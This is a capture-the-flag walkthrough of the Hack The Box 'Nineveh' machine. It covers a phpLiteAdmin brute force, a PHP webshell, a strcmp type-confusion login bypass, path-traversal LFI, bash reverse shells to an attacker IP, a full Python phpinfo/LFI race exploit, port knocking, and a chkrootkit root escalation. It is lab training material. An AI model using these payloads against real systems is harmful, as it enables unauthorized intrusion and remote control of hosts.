### Summary
We begin this box with access to a website whose subdirectories we scour on ports `80` and `443`. Port `443` contains a `phpLiteAdmin` portal whose password we can brute-force, allowing us to exploit an RCE vulnerability via a SQLite database. However, due to the location, we can't utilize this exploit without LFI. Port `80` contains a login portal that is vulnerable to information leakage and `php` Type confusion, allowing us to bypass it completely and log in as the `admin` user. From there, we can identify an `LFI` exploit, giving us `RCE`. If we didn't have this combo, we could also utilize our `LFI` with a `phpinfo()` endpoint that has file upload enabled. From there, we see the `knockd` service running which opens port `22` after a specific port knocking sequence. From there it's confusing but we need to extract an `rsa` key embedded within an image secured from the website to log in as user `amrois`. Then, we see from their `cron` and service enumeration to see that the `chkroot` rootkit checking binary is running which is vulnerable to `root` privesc.

### Tools
- `feroxbuster`
- `ffuf`
- `nmap` - port knocking script
- `binwalk` & `strings` - steg
- `pspy` - system process enumeration in real-time

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80/443]]
	- [[#HTTP - TCP 80]]
	- [[#HTTPS - TCP 443]]
###### [[#User Shell - www-data]]
- [[#phpLiteAdmin Brute Force]]
- [[#department Type Confusion]]
	- [[#php Type Confusion Explanation]]
- [[#LFI in /department/manage.php]]
- [[#PHP Info + LFI = RCE]]
	- [[#poc]]
###### [[#Priv www-data -> amrois]]
- [[#Enumeration as amrois|Enumeration]]
	- [[#pspy]]
- [[#Chkrootkit]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.49.44 -oN nmap/tcp             
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

❯ sudo nmap -p 80,443 -sCV -vv 10.129.49.44 -oN nmap/tcpScripts            
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/localityName=Athens/emailAddress=admin@nineveh.htb
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/localityName=Athens/emailAddress=admin@nineveh.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
| SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
| -----BEGIN CERTIFICATE-----
| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
| KrYQgX28Ulf8OSGJuA==
|_-----END CERTIFICATE-----
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```
- `UDP` port scanning shows bumpkis
- Given the `Apache httpd 2.4.18`, we're likely working with Ubuntu `16.04 - 16.10`

## Web - TCP 80/443
---
- Navigating to `http://10.129.49.44` gives us a blank, default webpage
- `https://10.129.49.44` is blank webpage with the image `https://10.129.49.44/ninevehForAll.png`
![[Pasted image 20251229202139.png]]

### HTTP - TCP 80
- We can enumerate subdirectories of the `HTTP` site with `feroxbuster`:
```sh
❯ feroxbuster -u "http://10.129.49.44" -x html,php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt

http://10.129.49.44/info.php
http://10.129.49.44/department/
http://10.129.49.44/department/files/
http://10.129.49.44/department/css/
```

- Navigating to `http://10.129.49.44/department/` redirects us to `http://10.129.49.44/department/login.php`, a login portal
- There's a comment in the login page:
```html
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```
- Looks like there's potential users `amrois` and `admin`
- When we attempt to log in with the credentials `admin:admin`, we get the error `Invalid Password`, indicating that we can potentially enumerate users if we're not rate-limited
- Attempting `amrois:password` gives `Invalid Username`

- `/info.php` brings us to a `php` page with lots of versioning information, `phpinfo()`
- `PHP Version 7.0.18-0ubuntu0.16.04.1`
	- Looks like we're working with `ubuntu 16.04 Xenial`

### HTTPS - TCP 443
- We should also enumerate the `HTTPS` subdirectories:
```sh
❯ feroxbuster -u "https://10.129.49.44" -x html,php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt --insecure

https://10.129.49.44/db/
https://10.129.49.44/secure_notes/
```

- `https://10.129.49.44/db/` brings us to a login portal for `phpLiteAdmin v1.9`
![[Pasted image 20251229213716.png]]
- A quick `searchsploit phpliteadmin` gives us a few potential vulnerabilities to work with:
```sh
❯ searchsploit phpliteadmin                                                  
phpLiteAdmin - 'table' SQL Injection           | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities    | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities  | php/webapps/39714.txt
```

- `https://10.129.49.44/secure_notes/` brings us to a blank page with a single image, `nineveh.png:
![[Pasted image 20251229213805.png]]

# User Shell - www-data
## phpLiteAdmin Brute Force
---
- We can capture a login request to the `phpLiteAdmin` page through Burp (change the password to `FUZZ`) and copy and paste the request as `login.req` for use with `ffuf`:
```sh
❯ ffuf -request login.req -w ~/ctf/TOOLS/wordlist/Passwords/twitter-banned.txt

...
password12     [Status: 200, Size: 11352, Words: 487, Lines: 484, Duration: 27ms]
password123    [Status: 200, Size: 13949, Words: 641, Lines: 484, Duration: 37ms]
...
```
- After `password123` was submitted, the request size was altered for the rest of the guesses, indicating a change in the request. The password is likely `password123` as visiting the page again shows us logged in!

- Referring back to `searchsploit`, we can grab a potential RCE:
```sh
❯ searchsploit -m 24044
  Exploit: PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
      URL: https://www.exploit-db.com/exploits/24044
     Path: /opt/exploitdb/exploits/php/webapps/24044.txt
    Codes: OSVDB-89126
 Verified: True
File Type: ASCII text
Copied to: /home/aldamd/ctf/htb/Nineveh - 10.129.49.44/24044.txt
```
- The steps are:
	- Create a new database that ends with `.php`
	- Create a new table and insert a text field with the value `<?php system($_GET["cmd"]); ?>`
		- Ensure `"` since the database is using `'`
![[Pasted image 20251229223439.png]]

- Unfortunately, we have no way of accessing the database since it's stored in `/var/tmp/fun.php`, inaccessible to the file structure of the webpage without `LFI`
![[Pasted image 20251229223610.png]]

## department Type Confusion
---
- Going back to `/department/login.php`, it looks like we can try to brute-force the login page
- However, given this is a `.php` file, we can attempt type confusion to bypass it altogether:
```http
username=admin&password[]=
```
- It works! Why does it work?
### php Type Confusion Explanation
- PHP is generous with how it handles comparing different types of data. So if the PHP is doing a string compare of a password from a database (or hard coded as is the case here) and the user input, it might look like this:
```php
if(strcmp($_REQUEST['password'], $password) == 0)
```

- `strcmp` returns where the two strings differ, as I can see in an interactive PHP terminal (`php -a`):
```php
php > strcmp("admin", "0xdf");
php > echo strcmp("admin", "0xdf");
1
php > echo strcmp("admin", "admin0xdf");
-4
php > echo strcmp("admin", "admin");
0
```

- If we pass in an array as one of the strings, PHP fails:
```php
php > echo strcmp(array(), "admin");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
```

- However, it is actually returning a NULL, and if that NULL is then compared to 0, it evaluates true:
```php
php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
oops
```

## LFI in /department/manage.php
---
- Now that we're logged in, we see 3 hyperlinks, `home` where we currently are, `logout`, and `notes`
- `notes` appends a parameter to the current page: `http://10.129.49.44/department/manage.php?notes=files/ninevehNotes.txt` and renders what looks like the contents of a file:
```text
- Have you fixed the login page yet! hardcoded username and password is really bad idea!
- check your serect folder to get in! figure it out! this is your challenge
- Improve the db interface.
    ~amrois
```

- This `notes` parameter looks like a potential LFI avenue:

| Payload                                                              | Result                             |
| -------------------------------------------------------------------- | ---------------------------------- |
| `notes=files/ninevehNotes.txt`                                       | Notes File                         |
| `notes=../../../../../etc/passwd`                                    | No note selected                   |
| `notes=files/ninevehNotes.txt/../../../../etc/passwd`                | Warning: failed to open filestream |
| `notes=files/ninevehNotes.txt/../../../../../../../../../etc/passwd` | Filename too long                  |
| `notes=files/ninevehNotes`                                           | Warning: failed to open filestream |
| `notes=files/nineveh`                                                | No note selected                   |
| `notes=files/ninevehNotes/../../../../../../etc/passwd`              | `/etc/passwd` contents             |
| `notes=/ninevehNotes/../etc/passwd`                                  | `/etc/passwd` contents             |
- It looks like for `LFI` to succeed, `/ninevehNotes` must be present in the parameter

- Now that we have `LFI`, we have `RCE` by accessing `/var/tmp/fun.php`!
- `http://10.129.49.44/department/manage.php?notes=/ninevehNotes/../var/tmp/fun.php&cmd=ls`:
```text
SQLite format 3@  -�
��f�'tablenormalnormalCREATE TABLE 'normal' ('shell' TEXT default 'css
files
footer.php
header.php
index.php
login.php
logout.php
manage.php
underconstruction.jpg
')

```

- We can pass a reverse shell payload (ensure using `"` and encode `&`) like so:
```http
GET /department/manage.php?notes=/ninevehNotes/../var/tmp/fun.php&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.50/12345+0>%261" HTTP/1.1
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.49.44.
Ncat: Connection from 10.129.49.44:58944.
bash: cannot set terminal process group (1419): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$   
```

## PHP Info + LFI = RCE
---
- If we didn't have the `phpLiteAdmin` instance, there is another way to obtain RCE if we have LFI and `phpinfo()` shows file upload is set to true for the `php` instance
- First we need to verify that file uploads is set to on for this `php` instance:
![[Pasted image 20251230152606.png]]

- We can then modify a request to `phpinfo()` (`info.php` in our case) from `GET` to `POST` and include file information to see where the file ends up:
```http
POST /info.php HTTP/1.1
Host: 10.129.49.44
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=s47d0ata5g5uejd3baailglic4
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------7db268605ae
Content-Length: 185

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt"
Content-Type: text/plain
-----------------------------7db268605ae
```
- Just added the `Content-Type` and the file data (`Content-Length` is populated automatically)
- Now we can scroll down to the `PHP Variables` section of `phpinfo()`
![[Pasted image 20251230153714.png]]

- We can use a script provided by [Insomnia](https://www.insomniasec.com/downloads/publications/phpinfolfi.py) that's been modified and updated to python3:
### poc
```python
#!/usr/bin/env python3
import sys
import socket
import threading
from dataclasses import dataclass

# -------------------------
# Configuration / Payloads
# -------------------------

@dataclass
class ExploitConfig:
    host: str
    port: int = 80
    threads: int = 10
    max_attempts: int = 1000
    padding_size: int = 5000

def build_requests(host: str, padding_size: int):
    tag = "Security Test"
	
    payload = (
        f"{tag}\r\n"
        "<?php $c=fopen('/tmp/g','w');"
        # "fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r\n"
        "fwrite($c,'<?php system(\"bash -c \\'bash -i >& /dev/tcp/10.10.14.50/12345 0>&1\\'\");?>');?>\r\n"
    )
	
    req1_data = (
        "-----------------------------7dbff1ded0714\r\n"
        'Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        f"{payload}"
        "-----------------------------7dbff1ded0714--\r\n"
    )
	
    padding = "A" * padding_size
	
    req1 = (
        f"POST /info.php?a={padding} HTTP/1.1\r\n"
        f"Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r\n"
        f"HTTP_ACCEPT: {padding}\r\n"
        f"HTTP_USER_AGENT: {padding}\r\n"
        f"HTTP_ACCEPT_LANGUAGE: {padding}\r\n"
        f"HTTP_PRAGMA: {padding}\r\n"
        "Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n"
        f"Content-Length: {len(req1_data)}\r\n"
        f"Host: {host}\r\n\r\n"
        f"{req1_data}"
    ).encode()
	
    lfi_req = (
        # "GET /lfi.php?load=%s%%00 HTTP/1.1\r\n"
        "GET /department/manage.php?notes=/ninevehNotes/../%s%%00 HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        f"Host: {host}\r\n\r\n"
    )
	
    return req1, lfi_req.encode(), tag.encode()

# -------------------------
# Networking Helpers
# -------------------------

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(sock, marker=b"", limit=65536):
    data = b""
    while marker not in data and len(data) < limit:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

# -------------------------
# Exploit Logic
# -------------------------

def get_offset(host, port, phpinfo_req):
    s = connect(host, port)
    s.sendall(phpinfo_req)
	
    data = recv_until(s, b"0\r\n\r\n")
    s.close()
	
    idx = data.find(b"[tmp_name] =>")
    if idx == -1:
        raise RuntimeError("tmp_name not found in phpinfo output")
	
    print(f"found tmp_name at offset {idx}")
    return idx + 256

def attempt_exploit(host, port, phpinfo_req, offset, lfi_req, tag):
    s1 = connect(host, port)
    s2 = connect(host, port)
	
    s1.sendall(phpinfo_req)
	
    data = b""
    while len(data) < offset:
        data += s1.recv(4096)
	
    try:
        idx = data.index(b"[tmp_name] =>")
        tmp_name = data[idx + 17 : idx + 31]
    except ValueError:
        s1.close()
        s2.close()
        return None
	
    s2.sendall(lfi_req % tmp_name)
    resp = s2.recv(4096)
	
    s1.close()
    s2.close()
	
    if tag in resp:
        return tmp_name.decode(errors="ignore")
	
    return None

# -------------------------
# Thread Worker
# -------------------------

class AttemptCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()
	
    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

class Worker(threading.Thread):
    def __init__(self, stop_event, counter, config, phpinfo_req, offset, lfi_req, tag):
        super().__init__(daemon=True)
        self.stop_event = stop_event
        self.counter = counter
        self.config = config
        self.phpinfo_req = phpinfo_req
        self.offset = offset
        self.lfi_req = lfi_req
        self.tag = tag
	
    def run(self):
        while not self.stop_event.is_set():
            attempt = self.counter.increment()
            if attempt > self.config.max_attempts:
                return
			
            try:
                result = attempt_exploit(
                    self.config.host,
                    self.config.port,
                    self.phpinfo_req,
                    self.offset,
                    self.lfi_req,
                    self.tag,
                )
				
                if result:
                    print("\nGot it! Shell created in /tmp/g")
                    self.stop_event.set()
                    return
			
            except socket.error:
                return

# -------------------------
# Main
# -------------------------

def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)
	
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} host [port] [threads]")
        sys.exit(1)
	
    host = socket.gethostbyname(sys.argv[1])
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
	
    config = ExploitConfig(host=host, port=port, threads=threads)
	
    phpinfo_req, lfi_req, tag = build_requests(config.host, config.padding_size)
	
    print("Getting initial offset...", end="", flush=True)
    offset = get_offset(config.host, config.port, phpinfo_req)
    print(" done")
	
    stop_event = threading.Event()
    counter = AttemptCounter()
	
    print(f"Spawning worker pool ({config.threads})...")
	
    workers = [
        Worker(stop_event, counter, config, phpinfo_req, offset, lfi_req, tag)
        for _ in range(config.threads)
    ]
	
    for w in workers:
        w.start()
	
    try:
        while not stop_event.wait(1):
            print(
                f"\r{counter.value:4d} / {config.max_attempts:4d}", end="", flush=True
            )
            if counter.value >= config.max_attempts:
                break
        print()
        print("Woot! \\m/" if stop_event.is_set() else ":(")
    except KeyboardInterrupt:
        print("\nStopping threads...")
        stop_event.set()
	
    for w in workers:
        w.join()
	
    print("Shuttin' down...")

if __name__ == "__main__":
    main()

```

# Priv: www-data -> amrois
## Enumeration
---
```sh
www-data@nineveh:/var/www/html/department$ find / -name "user.txt" 2>/dev/null
/home/amrois/user.txt
www-data@nineveh:/var/www/html/department$ cat /home/amrois/user.txt
cat: /home/amrois/user.txt: Permission denied
```
- Unfortunately we can't grab `user.txt` just yet
- We don't have passwordless `sudo`
- Nothing interesting in `/etc/crontab`
- If we check all running processes, there's one that might be of interest:
```sh
www-data@nineveh:/var/www/html/department$ ps auxww | grep -i knock
root      1316  0.4  0.2   8756  2224 ?        Ss   Dec29   5:18 /usr/sbin/knockd -d -i ens160
```

### port knocker
- We can inspect the configuration file for `knock` in `/etc/knockd.conf`
```conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```
- From here it seems that if we knock on ports `572`, `290`, then `911` all within 5 seconds, the firewall will accept incoming connections to port `22`, `ssh`
- We can get a nice `nmap` port knocking script from the [Arch wiki](https://wiki.archlinux.org/title/Port_knocking) and adapt it for our needs:
```sh
❯ for i in 571 290 911; do  
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.49.44 >/dev/null        
done; nc -v 10.129.49.44 22
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.49.44:22.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
```
- And we're up! But now what? We don't have any credentials

## Secure Notes Steg
---
- When we discovered the `LFI` endpoint, there was a hint in the `ninevehNotes.txt` file to check the secret folder
- In the `/secure_notes/` endpoint, there was an image, `nineveh.png` 
- If we perform `strings` on it, we see that there are public and private `RSA` keys embedded in the image
- We can cleanly extract them with `binwalk -Me` and we find a tarball with the directory `secret` that contains both keys, the public key belonging to the user `amrois`
- Now that we've externally opened `ssh`, we can easily log in using the private key!
```sh
❯ ssh -i nineveh.priv amrois@10.129.49.44 
amrois@nineveh:~$ 
```

- If we didn't want to do that port knocking nonsense, we could instead copy over the `ssh` key to our shell via `www-data` and use it there
```sh
www-data@nineveh:/tmp$ vi nineveh.priv
www-data@nineveh:/tmp$ chmod 600 nineveh.priv
www-data@nineveh:/tmp$ ssh -i nineveh.priv amrois@localhost
amrois@nineveh:~$
```

# Priv: amrois -> root
## Enumeration as amrois
---
- Now that we've got access as `amrois`, we can grab `user.txt`:
```sh
amrois@nineveh:~$ cat /home/amrois/user.txt
963d003f3cd8f310e403d72e8d9a2e94
```

- Attempting passwordless `sudo` gives us nothing
- Viewing our crontab with `crontab -l` we see an interesting line:
```sh
*/10 * * * * /usr/sbin/report-reset.sh
```
```sh
amrois@nineveh:~$ cat /usr/sbin/report-reset.sh 
#!/bin/bash

rm -rf /report/*.txt
```
```sh
amrois@nineveh:~$ ls -lah /report/
total 80K
drwxr-xr-x  2 amrois amrois 4.0K Dec 30 15:48 .
drwxr-xr-x 24 root   root   4.0K Jan 29  2021 ..
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:40 report-25-12-30:15:40.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:41 report-25-12-30:15:41.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:42 report-25-12-30:15:42.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:43 report-25-12-30:15:43.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:44 report-25-12-30:15:44.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:45 report-25-12-30:15:45.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:46 report-25-12-30:15:46.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:47 report-25-12-30:15:47.txt
-rw-r--r--  1 amrois amrois 4.7K Dec 30 15:48 report-25-12-30:15:48.txt
```
```sh
amrois@nineveh:/report$ cat report-25-12-30:15:48.txt
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron\'... not infected
...
Searching for suspect PHP files... 
/var/tmp/fun.php
...
```
- It looks like the contents of the `/report` directory has a bunch of log files that are checking for infected binaries and otherwise suspicious files
- It managed to flag our webshell `fun.php`
- Looking up the log file contents on google directs us to forum posts on `chkrootkit`

### pspy
- If we weren't able to backtrack to `chkrootkit` from looking up the log file contents, we could use `pspy` to enumerate system processes in real-time without root access
- We need only download a [release](https://github.com/DominicBreuker/pspy) and serve it up through a python web server and `curl` it over to our machine and run
- After waiting a bit, there's a flurry of activity with a large number of references to `/usr/bin/chkrootkit`

## Chkrootkit
---
- We can use `searchsploit chkrootkit` to find a local privilege escalation vuln in the software
```sh
❯ searchsploit -m 33899     
  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/33899
     Path: /opt/exploitdb/exploits/linux/local/33899.txt
    Codes: CVE-2014-0476, OSVDB-107710
 Verified: True
File Type: ASCII text
Copied to: /home/aldamd/ctf/htb/Nineveh - 10.129.49.44/33899.txt
```
```sh
#
# SLAPPER.{A,B,C,D} and the multi-platform variant
#
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \
         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |
tr -d :`
   fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ ${STATUS} -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi
         return ${NOT_INFECTED}
   fi
}
```
- The line `file_port=$file_port $i` will execute all files specified in `$SLAPPER_FILES` as the user chkrootkit is running (usually root), if `$file_port` is empty, because of missing quotation marks around the variable assignment.

- In order to exploit:
	- Put an executable file named `update` with non-root owner in `/tmp` (not mounted noexec, obviously)
	- Run chkrootkit (as uid 0)
- We can throw together a quick bash script reverse shell and save it to `/tmp/update`:
```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.50/12345 0>&1
```
```sh
❯ nc -lvnp 12345             
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.49.44.
Ncat: Connection from 10.129.49.44:58954.
bash: cannot set terminal process group (19137): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# cat /root/root.txt
cat /root/root.txt
57cf00a45494c822ce7fabd193bad3d8
```
